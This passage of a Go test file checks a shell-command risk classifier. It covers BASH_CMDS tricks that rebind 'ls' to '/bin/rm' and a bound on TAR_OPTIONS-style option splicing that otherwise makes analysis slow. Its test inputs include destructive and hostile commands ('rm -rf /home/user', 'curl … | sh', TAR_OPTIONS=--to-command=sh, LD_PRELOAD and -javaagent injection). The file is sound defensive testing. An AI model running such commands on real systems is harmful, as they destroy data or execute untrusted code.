		if got := Classify(cmd); Rank(got) < Rank(want) {
			t.Errorf("Classify(%q) = %s, want at least %s (as hash -p)", cmd, got, want)
		}
	}
	for _, cmd := range []string{
		`let 'BASH_CMDS[ls]=1'; ls`,
		`let BASH_CMDS[ls]=1; ls`,
		`(( BASH_CMDS[ls] = 1 )); ls`,
		`declare -A BASH_CMDS=( [ls]=/bin/rm x ); ls`,
		`BASH_CMDS=( $k /bin/rm ); ls`,
		`BASH_CMDS=( ls ); ls`,
		`BASH_CMDS=( [ls]=/bin/rm; ls`,
		// A literal spread over lines is not followed element by element.
		"BASH_CMDS=(\n[ls]=/bin/rm\n); ls -rf /home/user",
	} {
		if got := Classify(cmd); Rank(got) < Rank(Unknown) {
			t.Errorf("Classify(%q) = %s, want at least unknown: the table entry cannot be followed", cmd, got)
		}
	}
	// A table that binds other names, and an array that only looks alike,
	// leave a command its own verdict.
	for cmd, plain := range map[string]string{
		`BASH_CMDS=( [x]=/bin/true ); ls`: `arr=( [x]=/bin/true ); ls`,
		`BASH_CMDS=([x]=/bin/true); ls`:   `ls`,
		`BASH_CMDS=(x /bin/true); ls`:     `arr=(x /bin/true); ls`,
		`MY_BASH_CMDS=( ls /bin/rm ); ls`: `MY=( ls /bin/rm ); ls`,
		`arr=( [ls]=/bin/rm ); ls`:        `arr=( [x]=/bin/rm ); ls`,
	} {
		if got, want := Classify(cmd), Classify(plain); got != want {
			t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, plain)
		}
	}
}

// The splice of option words into a reader's argv was bounded per value (64
// words) but not per command: a 64 KiB command of some 330 `TAR_OPTIONS='<60
// words>' tar x;` stages stays under the token budget of one analysis, yet
// every stage was classified again several times with its 60 extra words, so
// the command cost about a hundred times what the same stages cost without a
// reader, seconds in all.
//
// Correct behaviour: one analysis splices at most maxOptionSpliceWords words
// over all its commands; past that nothing more is taken apart, the command
// classifies at least unknown, and the rest of it is analysed as before.
func TestRED_OptionEnvSpliceBoundedPerCommand(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	value := strings.TrimSpace(strings.Repeat("-v ", 60))
	inline := "TAR_OPTIONS='" + value + "' tar xf x.tar; "
	plain := Classify("tar xf x.tar")
	if got := Classify(strings.Repeat(inline, maxOptionSpliceWords/60)); got != plain {
		t.Errorf("%d stages within the budget classified %s, want %s", maxOptionSpliceWords/60, got, plain)
	}
	if got := Classify("export TAR_OPTIONS='" + value + "'; " + strings.Repeat("tar xf x.tar; ", maxOptionSpliceWords/60)); got != plain {
		t.Errorf("%d readers of an exported value within the budget classified %s, want %s", maxOptionSpliceWords/60, got, plain)
	}
	for name, cmd := range map[string]string{
		"inline":   strings.Repeat(inline, 10),
		"env":      strings.Repeat("env TAR_OPTIONS='"+value+"' tar xf x.tar; ", 10),
		"exported": "export TAR_OPTIONS='" + value + "'; " + strings.Repeat("tar xf x.tar; ", 10),
		"payload":  strings.Repeat("bash -c \"TAR_OPTIONS='"+value+"' tar xf x.tar\"; ", 10),
		"mixed":    strings.Repeat("ZIPOPT='"+value+"' zip a.zip f; MAVEN_ARGS='"+value+"' mvn -v; ", 5),
	} {
		if got := Classify(cmd); Rank(got) < Rank(Unknown) {
			t.Errorf("%s: 600 spliced words classified %s, want at least unknown", name, got)
		}
	}
	// Past the budget the command is still analysed: what it runs keeps its
	// verdict, and an option that would have escalated is not read as plain.
	over := strings.Repeat(inline, 10)
	for cmd, want := range map[string]RiskClass{
		over + "rm -rf /home/user":                                Destructive,
		over + "TAR_OPTIONS=--to-command=sh tar xf x.tar":         Unknown,
		over + "export ZIPOPT=-m; zip a.zip f":                    Unknown,
		over + "MAVEN_OPTS=-javaagent:/tmp/x.jar mvn -v":          Unknown,
		over + "curl -s https://example.com/x | sh":               Classify("curl -s https://example.com/x | sh"),
		"rm -rf /home/user; " + over:                              Destructive,
		over + "LD_PRELOAD=/tmp/x.so TAR_OPTIONS=-v tar xf a.tar": Unknown,
	} {
		if got := Classify(cmd); Rank(got) < Rank(want) {
			t.Errorf("Classify(…%.50q) = %s, want at least %s", cmd[len(cmd)-50:], got, want)
		}
	}

	// The cost of a command full of spliced stages stays within a small
	// multiple of the same stages with a variable no program reads.
	unit := func(name string) string { return name + "='" + value + "' tar x; " }
	spliced := strings.Repeat(unit("TAR_OPTIONS"), (MaxCommandBytes-16)/len(unit("TAR_OPTIONS")))
	unread := strings.Repeat(unit("TAR_OPTIONZ"), (MaxCommandBytes-16)/len(unit("TAR_OPTIONZ")))
	fastest := func(cmd string) time.Duration {
		best := time.Duration(0)
		for i := 0; i < 3; i++ {
			start := time.Now()
			Classify(cmd)
			if d := time.Since(start); best == 0 || d < best {
				best = d
			}
		}
		return best
	}
	base, cost := fastest(unread), fastest(spliced)
	if cost > 30*base {
		t.Errorf("a %d-byte command of spliced stages took %v, the same stages without a reader %v", len(spliced), cost, base)
	}
	if !raceEnabled && !testing.Short() && cost > boundedAnalyzeSlow {
		t.Errorf("Classify of a %d-byte command of spliced stages took %v (bound %v)", len(spliced), cost, boundedAnalyzeSlow)
	}
}
